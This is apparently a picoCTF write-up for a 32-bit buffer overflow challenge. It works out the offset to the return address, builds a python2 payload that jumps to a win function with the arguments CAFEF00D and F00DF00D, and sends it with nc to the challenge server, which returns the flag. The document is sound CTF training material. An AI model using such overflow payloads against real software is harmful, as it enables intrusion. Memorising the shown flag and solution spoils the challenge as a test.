# Control the Return-addres

##### Information:
The offset is at 112.
```
python2 -c "print('A' * 112 + 'B' * 4)" # CONTROLS THE EIP
```
##### Functions:
WIN =   0x08049296 # \x96\x92\x04\x08
MAIN =  0x08049372

##### Get passed the CAFEF00D and F00DF00D arguments
0xCAFEF00D # \x0D\xF0\xFE\xCA
0xF00DF00D # \x0D\xF0\x0D\xF0

### Create payload to jump to win func and compare $ebp+0x8
└─$ python2 -c "print('A' * 112 + b'\x96\x92\x04\x08' + b'\x72\x93\x04\x08' + b'\x0D\xF0\xFE\xCA' + b'\x0D\xF0\x0D\xF0')" > payload
``` 
 →  0x804930c <win+118>        cmp    DWORD PTR [ebp+0x8], 0xcafef00d
    0x8049313 <win+125>        jne    0x804932f <win+153>
    0x8049315 <win+127>        cmp    DWORD PTR [ebp+0xc], 0xf00df00d
``` 
```
gef➤  x $ebp+0x8
0xffffcf84:     0xcafef00d

gef➤  x $ebp+0xc
0xffffcf88:     0xf00df00d
```
### final payload:
└─$ nc saturn.picoctf.net 56529 < payload
Please enter your string: 
���AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�r�
picoCTF{argum3nt5_4_d4yZ_5d80816e}